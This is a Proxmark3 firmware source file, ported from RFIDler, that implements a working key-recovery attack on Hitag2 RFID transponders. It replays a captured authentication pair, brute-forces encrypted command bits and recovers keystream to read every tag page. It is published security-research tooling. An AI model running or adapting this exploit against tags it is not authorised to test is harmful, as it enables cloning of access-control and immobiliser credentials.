//-----------------------------------------------------------------------------
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------

// This coode has been converted from RFIDler source code to work with Proxmark3. 
// https://github.com/AdamLaurie/RFIDler/blob/master/firmware/Pic32/RFIDler.X/src/hitag2crack.c


#include "hitag2_crack.h"
#include "hitag2_crypto.h"
#include "hitag2.h"
#include "proxmark3_arm.h"
#include "commonutil.h"
#include "dbprint.h"
#include "util.h"
#include "string.h"
#include "BigBuf.h"
#include "cmd.h"

const static uint8_t ERROR_RESPONSE[] = { 0xF4, 0x02, 0x88, 0x9C };

// #define READP0CMD "1100000111"
const static uint8_t read_p0_cmd[] = {1,1,0,0,0,0,0,1,1,1};

// hitag2crack_xor XORs the source with the pad to produce the target.
// source, target and pad are binarrays of length len.
static void hitag2crack_xor(uint8_t *target, const uint8_t *source, const uint8_t *pad, uint16_t len) {
    for (uint16_t i = 0; i < len; i++) {
        target[i] = source[i] ^ pad[i];
    }
}

// hitag2crack_send_e_cmd replays the auth and sends the given encrypted
// command.
// responsestr is the hexstring of the response to the command;
// nrar is the 64 bit binarray of the nR aR pair;
// cmd is the binarray of the encrypted command to send;
// len is the length of the encrypted command.
static bool hitag2crack_send_e_cmd(uint8_t *resp, uint8_t *nrar, uint8_t *cmd, int len) {

    memset(resp, 0, 4);

    // Get UID
    uint8_t uid[4];
    if (ht2_read_uid(uid, false, false, true) != PM3_SUCCESS) {
        return false;
    }

    // send nrar and receive (useless) encrypted page 3 value
    uint8_t e_page3[4];
    size_t n = 0;
    if (ht2_tx_rx(nrar, 64, e_page3, &n, true, true) != PM3_SUCCESS) {
        return false;
    }

    // send encrypted command
    n = 0;
    ht2_tx_rx(cmd, len, resp, &n, true, false);

    if (n == 32) {
        return true;
    }
    return false;
}

// hitag2crack_read_page uses the supplied key stream and nrar pair to read the
// given page, returning the response as a hexstring.
// responsestr is the returned hexstring;
// pagenum is the page number to read;
// nrar is the 64 bit binarray of the nR aR pair;
// keybits is the binarray of the key stream.
static bool hitag2crack_read_page(uint8_t *resp, uint8_t pagenum, uint8_t *nrar, uint8_t *keybits) {

    if (pagenum > 7) {
        return false;
    }

    // create cmd
    uint8_t cmd[10];
    memcpy(cmd, read_p0_cmd, sizeof(read_p0_cmd));

    if (pagenum & 0x1) {
        cmd[9] = !cmd[9];
        cmd[4] = !cmd[4];
    }

    if (pagenum & 0x2) {
        cmd[8] = !cmd[8];
        cmd[3] = !cmd[3];
    }

    if (pagenum & 0x4) {
        cmd[7] = !cmd[7];
        cmd[2] = !cmd[2];
    }

    // encrypt command
    uint8_t e_cmd[10] = {0};
    hitag2crack_xor(e_cmd, cmd, keybits, 10);

    // send encrypted command
    uint8_t e_resp[4];
    if (hitag2crack_send_e_cmd(e_resp, nrar, e_cmd, 10)) {

        // check if it is valid   OBS!
        if (memcmp(e_resp, ERROR_RESPONSE, 4)) {

            uint8_t e_response[32];
            uint8_t response[32];

            // convert to binarray
            hex2binarray((char*)e_response, (char*)e_resp);
            // decrypt response
            hitag2crack_xor(response, e_response, keybits + 10, 32);

            // convert to hexstring
            binarray2hex(response, 32, resp);

            return true;
        } 
    }

    return false;
}

// hitag2crack_test_e_p0cmd XORs the message (command + response) with the
// encrypted version to retrieve the key stream.  It then uses this key stream
// to encrypt an extended version of the READP0CMD and tests if the response
// is valid.
// keybits is the returned binarray of the key stream;
// nrar is the 64 bit binarray of nR aR pair;
// e_cmd is the binarray of the encrypted command;
// uid is the binarray of the card UID;
// e_uid is the binarray of the encrypted version of the UID.
static bool hitag2crack_test_e_p0cmd(uint8_t *keybits, uint8_t *nrar, uint8_t *e_cmd, uint8_t *uid, uint8_t *e_uid) {

    uint8_t cipherbits[42];
    memcpy(cipherbits, e_cmd, 10);          // copy encrypted cmd to cipherbits
    memcpy(cipherbits + 10, e_uid, 32);     // copy encrypted uid to cipherbits


    uint8_t plainbits[42];
    memcpy(plainbits, read_p0_cmd, sizeof(read_p0_cmd));    // copy cmd to plainbits
    memcpy(plainbits + 10, uid, 32);                        // copy uid to plainbits

    // xor the plainbits with the cipherbits to get keybits
    hitag2crack_xor(keybits, plainbits, cipherbits, 42);

    // create extended cmd -> 4 * READP0CMD = 40 bits
    uint8_t ext_cmd[40];
    memcpy(ext_cmd, read_p0_cmd, sizeof(read_p0_cmd));
    memcpy(ext_cmd + 10, read_p0_cmd, sizeof(read_p0_cmd));
    memcpy(ext_cmd + 20, read_p0_cmd, sizeof(read_p0_cmd));
    memcpy(ext_cmd + 30, read_p0_cmd, sizeof(read_p0_cmd));

    // xor extended cmd with keybits
    uint8_t e_ext_cmd[40];
    hitag2crack_xor(e_ext_cmd, ext_cmd, keybits, 40);

    // send extended encrypted cmd
    uint8_t resp[4];
    if (hitag2crack_send_e_cmd(resp, nrar, e_ext_cmd, 40)) {

        // test if it was valid
        if (memcmp(resp, ERROR_RESPONSE, 4)) {
            return true;
        }
    }
    return false;
}

// hitag2crack_find_e_page0_cmd tries all bit-flipped combinations of the
// valid encrypted command and tests the results by attempting an extended
// command version of the command to see if that produces a valid response.
// keybits is the returned binarray of the recovered key stream;
// e_page0cmd is the returned binarray of the encrypted 'read page 0' command;
// e_firstcmd is the binarray of the first valid encrypted command found;
// nrar is the binarray of the 64 bit nR aR pair;
// uid is the binarray of the 32 bit UID.
static bool hitag2crack_find_e_page0_cmd(uint8_t *keybits, uint8_t *e_firstcmd, uint8_t *nrar, uint8_t *uid) {

    // we're going to brute the missing 4 bits of the valid encrypted command
    for (uint8_t a = 0; a < 2; a++) {
        for (uint8_t b = 0; b < 2; b++) {
            for (uint8_t c = 0; c < 2; c++) {
                for (uint8_t d = 0; d < 2; d++) {
                    // create our guess by bit flipping the pattern of bits
                    // representing the inverted bit and the 3 page bits
                    // in both the non-inverted and inverted parts of the
                    // encrypted command.
                    uint8_t guess[10];                    
                    memcpy(guess, e_firstcmd, 10);
                    if (a) {
                        guess[5] = !guess[5];
                        guess[0] = !guess[0];
                    }

                    if (b) {
                        guess[7] = !guess[7];
                        guess[2] = !guess[2];
                    }

                    if (c) {
                        guess[8] = !guess[8];
                        guess[3] = !guess[3];
                    }

                    if (d) {
                        guess[9] = !guess[9];
                        guess[4] = !guess[4];
                    }

                    // try the guess
                    uint8_t resp[4];
                    if (hitag2crack_send_e_cmd(resp, nrar, guess, 10)) {

                        // check if it was valid
                        if (memcmp(resp, ERROR_RESPONSE, 4)) {

                            // convert response to binarray
                            uint8_t e_uid[32];
                            hex2binarray((char*)e_uid, (char*)resp);

                            // test if the guess was 'read page 0' command
                            if (hitag2crack_test_e_p0cmd(keybits, nrar, guess, uid, e_uid)) {
                                return true;
                            }
                        }
                    }
                }
            }
        }
    }
    return false;
}

// hitag2crack_find_valid_e_cmd repeatedly replays the auth protocol each
// with a different sequential encrypted command value in order to find one
// that returns a valid response.
// e_cmd is the returned binarray of the valid encrypted command;
// nrar is the binarray of the 64 bit nR aR pair.
static bool hitag2crack_find_valid_e_cmd(uint8_t *e_cmd, uint8_t *nrar) {

    // we're going to hold bits 5, 7, 8 and 9 and brute force the rest
    // e.g. x x x x x 0 x 0 0 0
    for (uint8_t a = 0; a < 2; a++) {
        for (uint8_t b = 0; b < 2; b++) {
            for (uint8_t c = 0; c < 2; c++) {
                for (uint8_t d = 0; d < 2; d++) {
                    for (uint8_t e = 0; e < 2; e++) {
                        for (uint8_t g = 0; g < 2; g++) {

                            // build binarray
                            //uint8_t guess[10] = { a, b, c, d, e, 0, g, 0, 0, 0 };
                            uint8_t guess[10];
                            guess[0] = a;
                            guess[1] = b;
                            guess[2] = c;
                            guess[3] = d;
                            guess[4] = e;
                            guess[5] = 0;
                            guess[6] = g;
                            guess[7] = 0;
                            guess[8] = 0;
                            guess[9] = 0;

                            // send guess
                            uint8_t resp[4];
                            if (hitag2crack_send_e_cmd(resp, nrar, guess, sizeof(guess))) {

                                // check if it was valid
                                if (memcmp(resp, ERROR_RESPONSE, 4)) {
                                    // return the guess as the encrypted command
                                    memcpy(e_cmd, guess, 10);
                                    return true;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return false;
}

// hitag2_crack implements the first crack algorithm described in the paper,
// Gone In 360 Seconds by Verdult, Garcia and Balasch.
// response is a multi-line text response containing the 8 pages of the cracked tag
// nrarhex is a string containing hex representations of the 32 bit nR and aR values 
void ht2_crack(uint8_t *nrar_hex) {

    clear_trace();

    lf_hitag_crack_response_t packet;
    memset((uint8_t*)&packet, 0x00, sizeof(lf_hitag_crack_response_t));

    int res = PM3_SUCCESS;

    // get uid as hexstring
    uint8_t uid_hex[4];
    if (ht2_read_uid(uid_hex, false, false, false) != PM3_SUCCESS) {
        packet.status = -1;
        res = PM3_EFAILED;
        goto out;
    }

    // convert to binarray
    uint8_t nrar[64] = {0};
    hex2binarray_n((char*)nrar, (char*)nrar_hex, 8);

    // find a valid encrypted command
    uint8_t e_firstcmd[10];
    if (hitag2crack_find_valid_e_cmd(e_firstcmd, nrar) == false) {
        packet.status = -2;
        res = PM3_EFAILED;
        goto out;
    }

    // now we got a first encrypted command inside  e_firstcmd
    uint8_t uid[32];
    hex2binarray_n((char*)uid, (char*)uid_hex, 4);

    // find the 'read page 0' command and recover key stream
    uint8_t keybits[42];
    if (hitag2crack_find_e_page0_cmd(keybits, e_firstcmd, nrar, uid) == false) {
        packet.status = -3;
        res = PM3_EFAILED;
        goto out;
    }

    // read all pages using key stream
    for (uint8_t i = 1; i < 8; i++) {
        hitag2crack_read_page(packet.data + (i * 4), i, nrar, keybits);
    }

    // copy UID since we already have it...
    memcpy(packet.data, uid_hex, 4);

    packet.status = 1;

out:
    reply_ng(CMD_LF_HITAG2_CRACK, res, (uint8_t*)&packet, sizeof(lf_hitag_crack_response_t));
}
